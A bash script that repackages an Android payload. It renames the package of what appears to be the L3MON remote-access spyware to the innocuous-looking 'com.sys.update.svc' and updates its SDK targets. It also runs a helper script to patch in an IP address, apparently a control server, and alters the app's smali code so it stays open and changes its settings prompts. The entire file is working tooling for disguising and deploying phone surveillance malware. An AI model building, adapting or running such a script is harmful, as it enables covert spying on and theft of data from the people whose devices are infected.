#!/bin/bash
set -e

OLD_PKG="com.etechd.l3mon"
NEW_PKG="com.sys.update.svc"
OLD_PATH="com/etechd/l3mon"
NEW_PATH="com/sys/update/svc"

# 1. Package Rename
OLD_PKG_ESC=$(echo "$OLD_PKG" | sed 's/\./\\./g')
find payload_source -type f -exec sed -i "s|$OLD_PKG_ESC|$NEW_PKG|g" {} +
find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +

mkdir -p "payload_source/smali/$NEW_PATH"
if [ -d "payload_source/smali/$OLD_PATH" ]; then
    mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
    rm -rf "payload_source/smali/com/etechd"
fi

# 2. Update SDK for Android 14
sed -i 's/minSdkVersion: .*/minSdkVersion: 26/g' payload_source/apktool.yml
sed -i 's/targetSdkVersion: .*/targetSdkVersion: 31/g' payload_source/apktool.yml
sed -i 's/minSdkVersion="[0-9]*"/minSdkVersion="26"/g' payload_source/AndroidManifest.xml
sed -i 's/targetSdkVersion="[0-9]*"/targetSdkVersion="31"/g' payload_source/AndroidManifest.xml

# 3. Patch IP
chmod +x patch_payload.sh
sed -i "s|$OLD_PATH/|$NEW_PATH/|g" patch_payload.sh
./patch_payload.sh

# 4. Disable Loop and Finish (Minimal Stable)
sed -i 's/const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"/const-string v7, "none"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "none"/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
sed -i "s|invoke-virtual {p0}, L$NEW_PATH/MainActivity;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/MainActivity.smali"

# 5. Manifest
sed -i "s|com.etechd.l3mon.MainActivity|com.sys.update.svc.MainActivity|g" payload_source/AndroidManifest.xml
